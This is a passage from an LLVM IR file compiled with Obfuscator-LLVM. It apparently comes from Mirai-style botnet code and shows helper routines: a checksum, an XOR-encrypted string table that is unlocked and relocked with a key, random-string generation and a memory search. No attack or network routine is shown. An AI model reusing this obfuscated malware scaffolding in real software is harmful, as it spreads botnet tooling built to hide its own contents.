  %.228 = phi i32 [ %73, %.lr.ph ], [ %68, %.lr.ph.preheader ]
  %72 = and i32 %.228, 65535
  %73 = add nuw nsw i32 %72, %71
  %74 = lshr i32 %73, 16
  %75 = icmp eq i32 %74, 0
  br i1 %75, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %52
  %.2.lcssa = phi i32 [ %68, %52 ], [ %73, %._crit_edge.loopexit ]
  %76 = trunc i32 %.2.lcssa to i16
  %77 = xor i16 %76, -1
  ret i16 %77
}

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i32 @rand_next() local_unnamed_addr #8 {
  ret i32 0
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alphastr(i8* nocapture, i32) local_unnamed_addr #0 {
  %3 = alloca [32 x i8], align 16
  tail call void @table_unlock_val(i8 zeroext 61)
  %4 = getelementptr inbounds [32 x i8], [32 x i8]* %3, i64 0, i64 0
  %5 = tail call i8* @table_retrieve_val(i32 61, i32* null)
  %6 = call i8* @strcpy(i8* nonnull %4, i8* %5) #10
  %7 = icmp eq i32 %1, 0
  br i1 %7, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %2
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.03 = phi i32 [ %8, %.lr.ph ], [ %1, %.lr.ph.preheader ]
  %.012 = phi i8* [ %11, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %8 = add nsw i32 %.03, -1
  %9 = call i32 @util_strlen(i8* nonnull %4) #10
  %10 = load i8, i8* %4, align 16
  %11 = getelementptr inbounds i8, i8* %.012, i64 1
  store i8 %10, i8* %.012, align 1
  %12 = icmp eq i32 %8, 0
  br i1 %12, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  call void @table_lock_val(i8 zeroext 61)
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @table_unlock_val(i8 zeroext) local_unnamed_addr #9 {
  tail call fastcc void @toggle_obf(i8 zeroext %0)
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define internal fastcc void @toggle_obf(i8 zeroext) unnamed_addr #9 {
  %2 = zext i8 %0 to i64
  %3 = load i32, i32* @table_key, align 4
  %4 = lshr i32 %3, 8
  %5 = lshr i32 %3, 16
  %6 = lshr i32 %3, 24
  %7 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %2, i32 1
  %8 = load i16, i16* %7, align 8
  %9 = icmp eq i16 %8, 0
  br i1 %9, label %._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %1
  %10 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %2, i32 0
  br label %11

; <label>:11:                                     ; preds = %.lr.ph, %11
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %11 ]
  %12 = load i8*, i8** %10, align 16
  %13 = getelementptr inbounds i8, i8* %12, i64 %indvars.iv
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = xor i32 %15, %3
  %17 = trunc i32 %16 to i8
  store i8 %17, i8* %13, align 1
  %18 = load i8*, i8** %10, align 16
  %19 = getelementptr inbounds i8, i8* %18, i64 %indvars.iv
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = xor i32 %21, %4
  %23 = trunc i32 %22 to i8
  store i8 %23, i8* %19, align 1
  %24 = load i8*, i8** %10, align 16
  %25 = getelementptr inbounds i8, i8* %24, i64 %indvars.iv
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = xor i32 %27, %5
  %29 = trunc i32 %28 to i8
  store i8 %29, i8* %25, align 1
  %30 = load i8*, i8** %10, align 16
  %31 = getelementptr inbounds i8, i8* %30, i64 %indvars.iv
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = xor i32 %33, %6
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %31, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %36 = load i16, i16* %7, align 8
  %37 = zext i16 %36 to i64
  %38 = icmp slt i64 %indvars.iv.next, %37
  br i1 %38, label %11, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %11
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @table_lock_val(i8 zeroext) local_unnamed_addr #9 {
  tail call fastcc void @toggle_obf(i8 zeroext %0)
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) local_unnamed_addr #9 {
  %3 = sext i32 %0 to i64
  %4 = icmp eq i32* %1, null
  br i1 %4, label %9, label %5

; <label>:5:                                      ; preds = %2
  %6 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %3, i32 1
  %7 = load i16, i16* %6, align 8
  %8 = zext i16 %7 to i32
  store i32 %8, i32* %1, align 4
  br label %9

; <label>:9:                                      ; preds = %2, %5
  %10 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %3, i32 0
  %11 = load i8*, i8** %10, align 16
  ret i8* %11
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @util_memsearch(i8* nocapture readonly, i32, i8* nocapture readonly, i32) local_unnamed_addr #5 {
  %5 = icmp sle i32 %3, %1
  %6 = icmp sgt i32 %1, 0
  %or.cond = and i1 %5, %6
  br i1 %or.cond, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %4
  %7 = sext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %20
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %20 ]
  %.016 = phi i32 [ 0, %.lr.ph.preheader ], [ %.1, %20 ]
  %8 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %9 = load i8, i8* %8, align 1
  %10 = sext i32 %.016 to i64
  %11 = getelementptr inbounds i8, i8* %2, i64 %10
  %12 = load i8, i8* %11, align 1
  %13 = icmp eq i8 %9, %12
  br i1 %13, label %14, label %20

; <label>:14:                                     ; preds = %.lr.ph
  %15 = add nsw i32 %.016, 1
  %16 = icmp eq i32 %15, %3
  br i1 %16, label %17, label %20

; <label>:17:                                     ; preds = %14
  %18 = trunc i64 %indvars.iv to i32
  %19 = add nsw i32 %18, 1
  br label %.loopexit

; <label>:20:                                     ; preds = %.lr.ph, %14
  %.1 = phi i32 [ %15, %14 ], [ 0, %.lr.ph ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %21 = icmp slt i64 %indvars.iv.next, %7
  br i1 %21, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %20
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %4, %17
  %.013 = phi i32 [ %19, %17 ], [ -1, %4 ], [ -1, %.loopexit.loopexit ]
  ret i32 %.013
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { argmemonly nounwind }
attributes #7 = { noinline nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noinline norecurse nounwind readnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind }
attributes #11 = { nounwind readnone }
attributes #12 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146846898}
!2 = !{i32 -2146846489}
!3 = distinct !{!3, !4}
!4 = !{!"llvm.loop.unroll.disable"}
!5 = distinct !{!5, !4}
